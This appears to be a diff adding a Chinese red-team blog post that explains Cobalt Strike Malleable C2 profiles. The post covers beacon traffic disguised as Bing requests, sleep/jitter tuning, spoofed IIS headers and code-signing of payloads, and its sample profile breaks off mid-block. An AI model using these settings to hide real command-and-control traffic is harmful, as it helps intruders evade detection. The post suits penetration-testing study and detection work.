@@ -1,0 +1,1517 @@
+<!DOCTYPE html>
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+<html class="theme-next muse use-motion" lang="cn">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2"/>
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+  
+  
+    
+      
+    
+    
+      
+    
+  <script src="//cdn.bootcss.com/pace/1.0.2/pace.min.js"></script>
+  <link href="//cdn.bootcss.com/pace/1.0.2/themes/blue/pace-theme-flash.min.css" rel="stylesheet">
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  
+  
+
+  
+    
+    
+  
+
+  
+    
+      
+    
+
+    
+  
+
+  
+
+  
+    
+      
+    
+
+    
+  
+
+  
+    
+      
+    
+
+    
+  
+
+  
+    
+    
+    <link href="//fonts.googleapis.com/css?family=Lato:300,300italic,400,400italic,700,700italic|Monda:300,300italic,400,400italic,700,700italic|Lobster Two:300,300italic,400,400italic,700,700italic|PT Mono:300,300italic,400,400italic,700,700italic&subset=latin,latin-ext" rel="stylesheet" type="text/css">
+  
+
+
+
+
+
+
+  
+
+<link href="//maxcdn.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=6.4.0" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=6.4.0">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=6.4.0">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=6.4.0">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=6.4.0" color="#222">
+
+
+
+
+
+
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Muse',
+    version: '6.4.0',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: false,
+    fastclick: false,
+    lazyload: false,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+  
+
+
+
+
+  <meta name="description" content="少而不学，老而无识。  唔，水文水文….">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Malleable-C2-Profiles配置">
+<meta property="og:url" content="https://lengjibo.github.io/malleable/index.html">
+<meta property="og:site_name" content="冷逸的个人博客|开往安河桥北~">
+<meta property="og:description" content="少而不学，老而无识。  唔，水文水文….">
+<meta property="og:locale" content="cn">
+<meta property="og:image" content="https://lengjibo.github.io/images/malleable/0.png">
+<meta property="og:image" content="https://lengjibo.github.io/images/malleable/1.png">
+<meta property="og:image" content="https://lengjibo.github.io/images/malleable/2.png">
+<meta property="og:image" content="https://lengjibo.github.io/images/malleable/3.png">
+<meta property="og:image" content="https://lengjibo.github.io/images/malleable/4.png">
+<meta property="og:image" content="https://lengjibo.github.io/images/malleable/5.png">
+<meta property="og:image" content="https://lengjibo.github.io/images/malleable/6.png">
+<meta property="og:image" content="https://lengjibo.github.io/images/malleable/7.png">
+<meta property="og:image" content="https://lengjibo.github.io/images/malleable/8.png">
+<meta property="og:image" content="https://lengjibo.github.io/images/malleable/9.png">
+<meta property="og:image" content="https://lengjibo.github.io/images/malleable/10.png">
+<meta property="og:image" content="https://lengjibo.github.io/images/malleable/11.png">
+<meta property="og:image" content="https://lengjibo.github.io/images/malleable/12.png">
+<meta property="og:image" content="https://lengjibo.github.io/images/malleable/13.png">
+<meta property="og:image" content="https://lengjibo.github.io/images/malleable/14.png">
+<meta property="og:image" content="https://lengjibo.github.io/images/malleable/15.png">
+<meta property="og:image" content="https://lengjibo.github.io/images/malleable/16.png">
+<meta property="og:updated_time" content="2020-09-02T07:56:47.415Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="Malleable-C2-Profiles配置">
+<meta name="twitter:description" content="少而不学，老而无识。  唔，水文水文….">
+<meta name="twitter:image" content="https://lengjibo.github.io/images/malleable/0.png">
+
+
+
+  <link rel="alternate" href="/../../.deploy_git/atom.xml" title="冷逸的个人博客|开往安河桥北~" type="application/atom+xml" />
+
+
+
+
+  <link rel="canonical" href="https://lengjibo.github.io/malleable/"/>
+
+
+
+<script type="text/javascript" id="page.configurations">
+  CONFIG.page = {
+    sidebar: "",
+  };
+</script>
+
+  <title>Malleable-C2-Profiles配置 | 冷逸的个人博客|开往安河桥北~</title>
+  
+
+
+
+
+
+
+
+
+
+  <noscript>
+  <style type="text/css">
+    .use-motion .motion-element,
+    .use-motion .brand,
+    .use-motion .menu-item,
+    .sidebar-inner,
+    .use-motion .post-block,
+    .use-motion .pagination,
+    .use-motion .comments,
+    .use-motion .post-header,
+    .use-motion .post-body,
+    .use-motion .collection-title { opacity: initial; }
+
+    .use-motion .logo,
+    .use-motion .site-title,
+    .use-motion .site-subtitle {
+      opacity: initial;
+      top: initial;
+    }
+
+    .use-motion {
+      .logo-line-before i { left: initial; }
+      .logo-line-after i { right: initial; }
+    }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="cn">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">冷逸的个人博客|开往安河桥北~</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+    
+  </div>
+
+  <div class="site-nav-toggle">
+    <button aria-label="Toggle navigation bar">
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  
+    <ul id="menu" class="menu">
+      
+        
+        
+        
+          
+          <li class="menu-item menu-item-home">
+    <a href="/" rel="section">
+      <i class="menu-item-icon fa fa-fw fa-home"></i> <br />Startseite</a>
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-about">
+    <a href="/about/" rel="section">
+      <i class="menu-item-icon fa fa-fw fa-user"></i> <br />Über</a>
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-tags">
+    <a href="/tags/" rel="section">
+      <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />Tags</a>
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-categories">
+    <a href="/categories/" rel="section">
+      <i class="menu-item-icon fa fa-fw fa-th"></i> <br />Kategorien</a>
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-archives">
+    <a href="/archives/" rel="section">
+      <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />Archiv</a>
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-book">
+    <a href="/book/" rel="section">
+      <i class="menu-item-icon fa fa-fw fa-book"></i> <br />book</a>
+  </li>
+
+      
+      
+    </ul>
+  
+
+  
+    
+
+  
+
+  
+</nav>
+
+
+
+  
+
+
+
+</div>
+    </header>
+
+    
+
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://lengjibo.github.io/malleable/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="冷逸">
+      <meta itemprop="description" content="做一个温柔的人...">
+      <meta itemprop="image" content="http://ww1.sinaimg.cn/large/007F8GgBly1g7vony4ltaj308w08wq30.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="冷逸的个人博客|开往安河桥北~">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">Malleable-C2-Profiles配置
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+        
+          <span class="post-time">
+
+            
+            
+            
+
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Veröffentlicht am</span>
+              
+
+              
+                
+              
+
+              <time title="Post created: 2020-09-02 15:33:40 / Updated at: 15:56:47" itemprop="dateCreated datePublished" datetime="2020-09-02T15:33:40+08:00">2020-09-02</time>
+            
+
+            
+              
+
+              
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">in</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/RedTeam/" itemprop="url" rel="index"><span itemprop="name">RedTeam</span></a></span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+            <span class="post-meta-divider">|</span>
+            <span class="post-meta-item-icon"
+            >
+            <i class="fa fa-eye"></i>
+             Views:  
+            <span class="busuanzi-value" id="busuanzi_value_page_pv" ></span>
+            </span>
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <p>少而不学，老而无识。</p>
+<hr>
+<p>唔，水文水文….</p>
+<a id="more"></a>
+<h2 id="关于Malleable-C2-Profiles"><a href="#关于Malleable-C2-Profiles" class="headerlink" title="关于Malleable-C2-Profiles"></a>关于Malleable-C2-Profiles</h2><p>在日常的渗透测试工作中，我们需要做很多的规避操作，因为我们所使用的C2工具等，可能早已被AV等防护软件所标记，所以我们需要订制我们的攻击工具。而这就引出了我们的今天的重点Malleable C2 ，Malleable C2 是 Cobalt Strike 的一项功能, 意为 “可定制的” 的 C2 服务器. Malleable C2 允许我们仅通过一个简单的配置文件来改变 Beacon 与 C2 通信时的流量特征与行为。</p>
+<p>调用方法为：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./teamserver [external IP] [password] [/path/to/my.profile]</span><br></pre></td></tr></table></figure>
+<p>官方链接地址为：<a href="https://www.cobaltstrike.com/help-malleable-c2" target="_blank" rel="noopener">https://www.cobaltstrike.com/help-malleable-c2</a></p>
+<p>测试方法为：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./c2lint [/path/to/my.profile]</span><br></pre></td></tr></table></figure>
+<p>本文只会对其中的技术点进行总结、说明，不会太关注于每一个参数的含义，因为那毕竟是wiki需要做的事。</p>
+<p>##　目标选择：</p>
+<p>关于profile的target选择，自然而然选择可信度的高的目标，比如360、bing、微软等等，这个根据个人需要选择即可。合法流量的捕获可使用wireshark或者burpsuite，关于这这两个工具的区别、使用不再赘述。</p>
+<h2 id="创建profile："><a href="#创建profile：" class="headerlink" title="创建profile："></a>创建profile：</h2><p>一般基本的profile一般包括以下基本部分：</p>
+<ul>
+<li>公共配置</li>
+<li>https证书(可选)</li>
+<li>http-get<ul>
+<li>client<ul>
+<li>metadata</li>
+</ul>
+</li>
+<li>server<ul>
+<li>output</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>http-post<ul>
+<li>client<ul>
+<li>id</li>
+<li>output</li>
+</ul>
+</li>
+<li>server<ul>
+<li>output</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>http-stager</li>
+</ul>
+<p>在 Malleable C2 中, 语句可分为数据转换语句, 终止语句, 额外语句 (Header and Parameter) 三种类型.</p>
+<p>数据转换语句有 base64 base64url mask netbios netbiosu prepend append.</p>
+<p>终止语句有 print uri-append header parameter.</p>
+<p>额外语句有 header parameter.</p>
+<p>在学习这些之前，我们可以先来简单了解一下CobaltStrike的通信过程(Beacon)：</p>
+<p><img src="../images/malleable/0.png" alt="image"></p>
+<p>当 Beacon 被执行后, 会在 C2 上下载载荷执行, 即 Stage 过程, Stageless 则省去了这一步.</p>
+<p>之后, Beacon 根据设置的睡眠时间进入睡眠状态, 结束后向 C2 发送有关 Beacon 的信息如系统类型, 版本, 当前用户, 称之为 Metadata.</p>
+<p>如果存在待执行的任务, C2 就会响应发送 Metadata 的请求, Beacon 将会收到有关 Task 的具体内容和唯一的 Task ID, 并依次执行任务.</p>
+<p>执行完毕后, Beacon 将各 Task 回显的数据与对应的 Task ID 依次上传至 C2, 然后再次进入睡眠状态.</p>
+<p>其中 Beacon 发送 Metadata 时一般使用 GET, 上传回显数据时使用 POST.</p>
+<p><strong>注：在3.6版本之后，可以将HTTP verb从POST改为GET。</strong></p>
+<p>下面我们开始编写profiles，关注profiles的编写有下面几个通用的点，可以防止错误。</p>
+<ul>
+<li>引用参数时使用双引号，不要使用单引号</li>
+<li>允许使用分号</li>
+<li>注意反斜线、引号转义</li>
+<li>特殊符号无须转义(!@#$%^&amp;*())</li>
+</ul>
+<p>首先编写公共部分,每部分进行一些讲解：</p>
+<p><strong>注：[]表示选项、&lt;&gt;表示提供的值</strong></p>
+<p><strong>配置文件名称</strong></p>
+<p><img src="../images/malleable/1.png" alt="image"></p>
+<p>随便设置一个名字即可。</p>
+<p><strong>sleep、jitter设置</strong></p>
+<p><img src="../images/malleable/2.png" alt="image"></p>
+<p>这两个选项用来设置休眠和抖动的值。其中sleep为回调时间以毫秒为单位，jitter为抖动值，为百分比，接收0-99的值，设置正确的sleep与jitter可以使我们的流量更好的绕过一些检测设备，并且与正常流量融合在一起。</p>
+<p><strong>host_stage、useragent设置</strong></p>
+<p><img src="../images/malleable/3.png" alt="image"></p>
+<p>host_stage设置是否分段载荷、useragent设置访问的ua信息。</p>
+<p><strong>设置SSL证书、代码签名证书</strong></p>
+<p>关于SSL证书，之前已经有很多文章曾经写过了，keytools生成即可，然后配置https-certificate、https-certificate这两个选项即可。</p>
+<p><img src="../images/malleable/4.png" alt="image"></p>
+<p>代码证书：在CS生成exe、dll时有一个sign选项，默认不可选，如下图这样：</p>
+<p><img src="../images/malleable/5.png" alt="image"></p>
+<p>此时需要配置code-signer参数，</p>
+<p><img src="../images/malleable/6.png" alt="image"></p>
+<p>配置后，使用c2init测试，发现下面的提示，则说明成功</p>
+<p><img src="../images/malleable/7.png" alt="image"></p>
+<p>此时启动CobaltStrike生产载荷，发现已经可以进行签名操作。</p>
+<p><img src="../images/malleable/8.png" alt="image"></p>
+<p><strong>响应头设置</strong></p>
+<p><img src="../images/malleable/9.png" alt="image"></p>
+<p>通过设置http-config来设置响应内容。若需要重定向，则将trust_x_forwarded_for设置为true。</p>
+<p><strong>设置自定义命名管道与TCP端口</strong></p>
+<p><img src="../images/malleable/10.png" alt="image"></p>
+<p><strong>流量特征</strong></p>
+<p>语法如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line">http-get &#123;</span><br><span class="line"></span><br><span class="line">	client &#123;</span><br><span class="line"></span><br><span class="line">		metadata &#123;</span><br><span class="line"></span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	server &#123;</span><br><span class="line"></span><br><span class="line">		output &#123;</span><br><span class="line"></span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">http-post &#123;</span><br><span class="line"></span><br><span class="line">	client &#123;</span><br><span class="line"></span><br><span class="line">		id &#123;</span><br><span class="line">		</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		output &#123;</span><br><span class="line"></span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	server &#123;</span><br><span class="line"></span><br><span class="line">		output &#123;</span><br><span class="line"></span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">http-stager &#123;</span><br><span class="line"></span><br><span class="line">	client &#123;</span><br><span class="line"></span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	server &#123;</span><br><span class="line"></span><br><span class="line">		output &#123;</span><br><span class="line"></span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>待码块按 HTTP 请求分为 http-get http-post 两种, 以及被单独列出来的 http-stager 用于 stage 过程.按照对象分为 client 和 server, 按照不同的通信步骤分为 metadata id 和 output. Beacon 在上传 Task 数据时是需要对应的 Task ID 的, id 块正好是针对 Task ID 的修改, output 块则是修改通过 POST 发送的数据, 而 server 中的 output 块仅仅是用于修改响应内容的。</p>
+<p>此时要注意的是，刚才所说的终止语句只能放在metadata id output 块, 不能直接放在 client 和 server 里, 而且终止语句的后面不能有其它语句, 也就是说只能放在代码块末尾.print 和 uri-append 无须指定参数, 后两者的格式为 header “Cookie” 和 parameter “action”, 即存放位置为 Cookie 字段和 action 参数。</p>
+<p>如：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">metadata &#123;</span><br><span class="line"></span><br><span class="line">	base64;</span><br><span class="line">	prepend &quot;token=&quot;;</span><br><span class="line">	header &quot;Cookie&quot;;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>则最后效果为：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Cookie: token=BASE64_ENC_DATA</span><br></pre></td></tr></table></figure>
+<p>除此之外还有下面的四种，可根据需要选择。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">#base64</span><br><span class="line">nqveOtUC+NlNAyHPVkSLMA==</span><br><span class="line"></span><br><span class="line">#base64url</span><br><span class="line">hf2D_5jHAA9ftoOe_ZY3zQ</span><br><span class="line"></span><br><span class="line">#netbios</span><br><span class="line">haklhhicanfeldpmgkefkhgjmhccgbmp</span><br><span class="line"></span><br><span class="line">#netbiosu </span><br><span class="line">HHHHGLGDJDELLEKFMDKAANJCLHIEFEMC</span><br></pre></td></tr></table></figure>
+<p>除此之外还有prepend 和 append 混用.等这里不再赘述。最后效果：</p>
+<p><img src="../images/malleable/11.png" alt="image"></p>
+<p><strong>HTTP-Stager</strong></p>
+<p><img src="../images/malleable/12.png" alt="image"></p>
+<p>设置派生过程。</p>
+<p><strong>各类规避设置</strong></p>
+<p><img src="../images/malleable/13.png" alt="image"></p>
+<p>这个部分不做过多讲解，另外可使用process-inject设置进程注入时的细节。</p>
+<p>至此一个简单的profile便编写完成了。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br></pre></td><td class="code"><pre><span class="line"># CobaltStrike 4.0+ Test Profile</span><br><span class="line">#</span><br><span class="line"># References:</span><br><span class="line">#   * https://www.cobaltstrike.com/help-malleable-c2</span><br><span class="line">#   * https://www.cobaltstrike.com/help-malleable-postex</span><br><span class="line">#</span><br><span class="line"># Author: lengyi@HongHuLab</span><br><span class="line"># Github: https://github.com/lengjibo</span><br><span class="line">#</span><br><span class="line">### Global Option Block</span><br><span class="line">set sample_name &quot;lengyi.profile&quot;;  # Profile name</span><br><span class="line"></span><br><span class="line">set sleeptime &quot;30000&quot;;   # Sleep time for the beacon callback</span><br><span class="line"># set sleeptime &quot;&lt;60000&gt;&quot;; # 1  Minute</span><br><span class="line"># set sleeptime &quot;&lt;70000&gt;&quot;; </span><br><span class="line"># set sleeptime &quot;&lt;80000&gt;&quot;; </span><br><span class="line"></span><br><span class="line">set jitter &quot;50&quot;; # Jitter to set %. In this example, the beacon will callback between 15 and 30 sec jitter</span><br><span class="line"></span><br><span class="line">set dns_idle &quot;8.8.4.4&quot;;</span><br><span class="line">set dns_sleep &quot;0&quot;;</span><br><span class="line">set maxdns    &quot;235&quot;;</span><br><span class="line"></span><br><span class="line">set host_stage &quot;true&quot;;  # Host payload for staging over HTTP, HTTPS, or DNS. Required by stagers.</span><br><span class="line">set useragent &quot;Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 7.0; InfoPath.3; .NET CLR 3.1.40767; Trident/6.0; en-IN)&quot;; # User-Agent</span><br><span class="line"> </span><br><span class="line">### Self-Signed Certificate HTTPS</span><br><span class="line"></span><br><span class="line">https-certificate &#123;</span><br><span class="line">    set CN       &quot;us&quot;; </span><br><span class="line">    set O        &quot;us&quot;;   </span><br><span class="line">    set C        &quot;us&quot;;</span><br><span class="line">    set L        &quot;us&quot;;</span><br><span class="line">    set OU       &quot;us&quot;;  </span><br><span class="line">    set ST       &quot;us&quot;;</span><br><span class="line">    set validity &quot;365&quot;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">### Valid SSL Certificate HTTPS</span><br><span class="line"></span><br><span class="line">https-certificate &#123;</span><br><span class="line">    set keystore &quot;zzhsec.store&quot;;</span><br><span class="line">    set password &quot;lengyi&quot;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">### Code Signing Certificate </span><br><span class="line"></span><br><span class="line">code-signer &#123;</span><br><span class="line">    set keystore &quot;keystore.jks&quot;;</span><br><span class="line">    set password &quot;123456&quot;;</span><br><span class="line">    set alias &quot;server&quot;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">### HTTP/S Global Response Header </span><br><span class="line"></span><br><span class="line">http-config &#123;</span><br><span class="line">    set headers &quot;Server, Content-Type, Cache-Control, Connection, X-Powered-By&quot;;        # HTTP header </span><br><span class="line">    header &quot;Server&quot; &quot;Microsoft-IIS/8.0&quot;;</span><br><span class="line">    header &quot;Content-Type&quot; &quot;text/html;charset=UTF-8&quot;;</span><br><span class="line">    header &quot;Cache-Control&quot; &quot;max-age=1&quot;;</span><br><span class="line">    header &quot;Connection&quot; &quot;keep-alive&quot;;</span><br><span class="line">    header &quot;X-Powered-By&quot; &quot;ASP.NET&quot;;</span><br><span class="line">    set trust_x_forwarded_for &quot;false&quot;;           # &quot;true&quot; if the team server is behind an HTTP redirector</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">### SMB Beacon </span><br><span class="line"></span><br><span class="line">set pipename &quot;win_svc&quot;;            </span><br><span class="line">set pipename_stager &quot;win_svc&quot;;     </span><br><span class="line"></span><br><span class="line">### TCP Beacon </span><br><span class="line"></span><br><span class="line">set tcp_port &quot;1337&quot;;                    # TCP beacon listen port</span><br><span class="line"></span><br><span class="line">### HTTP-GET</span><br><span class="line"></span><br><span class="line">http-get &#123;</span><br><span class="line"></span><br><span class="line">    set uri &quot;/search/&quot;;</span><br><span class="line"></span><br><span class="line">    client &#123;</span><br><span class="line"></span><br><span class="line">        header &quot;Host&quot; &quot;www.bing.com&quot;;</span><br><span class="line">        header &quot;Accept&quot; &quot;text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8&quot;;</span><br><span class="line">        header &quot;Cookie&quot; &quot;DUP=Q=GpO1nJpMnam4UllEfmeMdg2&amp;T=283767088&amp;A=1&amp;IG&quot;; </span><br><span class="line">        </span><br><span class="line">        metadata &#123;</span><br><span class="line">            base64url;</span><br><span class="line">            parameter &quot;q&quot;;</span><br><span class="line">        